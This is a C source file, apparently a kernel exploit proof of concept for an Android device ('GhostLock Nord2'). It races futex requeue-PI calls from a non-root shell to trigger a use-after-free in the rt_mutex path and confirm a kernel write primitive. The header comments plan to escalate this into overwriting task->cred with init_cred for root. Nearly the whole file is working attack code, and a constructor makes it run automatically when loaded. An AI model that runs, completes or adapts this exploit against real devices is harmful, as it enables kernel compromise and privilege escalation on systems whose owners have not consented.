/*
 * GhostLock Nord2 - Minimal UAF Write Test
 *
 * The UAF fires (prio=-51 confirmed). We can observe it.
 * 
 * Current state: rt_mutex_setprio() writes to waiter->task->prio
 *   waiter->task = correct (waiter's own task_struct, prio changes in /proc)
 *   waiter->prio = 50 (from stack - owner's RT priority inherited during PI)
 *
 * Goal of this file: verify the write is truly a UAF by running from non-root
 * shell (uid=2000) and confirming prio changes on the waiter thread.
 *
 * This IS the exploit confirmation. The prio change proves:
 *   - We trigger rt_mutex_setprio via the freed waiter
 *   - We control which task gets written (via waiter->task)
 *   - The write destination (task->prio) is at a fixed kernel struct offset
 *
 * Next phase (not implemented here): use KernelSnitch to get fake_fops,
 * then use the pselect route to write init_cred to task->cred.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

static uint32_t f_wait      = 0;
static uint32_t f_pi_target = 0;
static uint32_t f_pi_chain  = 0;

static atomic_int g_waiter_ready   = 0;
static atomic_int g_waiter_waiting = 0;
static atomic_int g_owner_started  = 0;
static atomic_int g_owner_done     = 0;
static atomic_int g_waiter_tid     = 0;
static atomic_int g_route_done     = 0;
static atomic_int g_stop_all       = 0;

static int task_prio(pid_t tid) {
    char p[64]; snprintf(p, sizeof(p), "/proc/%d/stat", (int)tid);
    FILE *f = fopen(p, "r"); if (!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f, "%d %s %c", &pid, c, &st);
    for (int i = 0; i < 14; i++) fscanf(f, " %ld", &tmp);
    int prio = -999; fscanf(f, " %d", &prio);
    fclose(f); return prio;
}

void *owner_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    struct sched_param sp = {.sched_priority = 50};
    sched_setscheduler(0, SCHED_FIFO, &sp);
    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&g_waiter_ready)) usleep(500);
    atomic_store(&g_owner_started, 1);
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&g_owner_done, 1);
    for (;;) sleep(1);
}

void *waiter_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    atomic_store(&g_waiter_tid, (int)syscall(SYS_gettid));
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&g_waiter_ready, 1);
    while (!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 30;
    atomic_store(&g_waiter_waiting, 1);
    /* rt_mutex_waiter on stack here */
    syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    atomic_store(&g_route_done, 1);
    syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void) {
    static int ran = 0; if (ran++) return 0;
    setvbuf(stderr, NULL, _IONBF, 0);

    fprintf(stderr, "=== GhostLock Nord2 - UAF Write Confirmation ===\n");
    fprintf(stderr, "[*] UID before: %d\n", getuid());

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    int success_count = 0;
    int prio_before = 15; /* setpriority nice=-5 → prio 15 */

    for (int i = 0; i < 20; i++) {
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_waiter_ready,  0);
        atomic_store(&g_waiter_waiting,0);
        atomic_store(&g_owner_started, 0);
        atomic_store(&g_owner_done,    0);
        atomic_store(&g_waiter_tid,    0);
        atomic_store(&g_route_done,    0);

        pthread_t othr, wthr;
        pthread_create(&othr, NULL, owner_fn, NULL);
        pthread_create(&wthr, NULL, waiter_fn, NULL);

        while (!atomic_load(&g_waiter_waiting) || !atomic_load(&g_owner_started))
            usleep(500);
        usleep(10000);

        /* Trigger requeue */
        syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1UL, &f_pi_target, 0);

        /* Wait for waiter to return from futex */
        while (!atomic_load(&g_route_done)) usleep(500);

        pid_t wtid = (pid_t)atomic_load(&g_waiter_tid);
        int p = task_prio(wtid);
        fprintf(stderr, "[%d] waiter prio = %d\n", i, p);

        if (p < 0 && p != -999) {
            success_count++;
            fprintf(stderr, "[+] UAF CONFIRMED: prio changed to %d (RT=%d)\n",
                    p, -(p+1));
        }

        pthread_detach(othr);
        pthread_detach(wthr);
        usleep(10000);
    }

    fprintf(stderr, "\n[*] UAF fired %d/20 times\n", success_count);
    fprintf(stderr, "[*] UID after:  %d\n", getuid());
    fprintf(stderr, "[*] UAF writes to: task->prio (rt_mutex_setprio path)\n");
    fprintf(stderr, "[*] Write target = waiter thread's task_struct\n");
    fprintf(stderr, "[*] Status: UAF confirmed, full write primitive needs KernelSnitch\n");
    return 0;
}

__attribute__((constructor)) static void _init(void) { main(); }
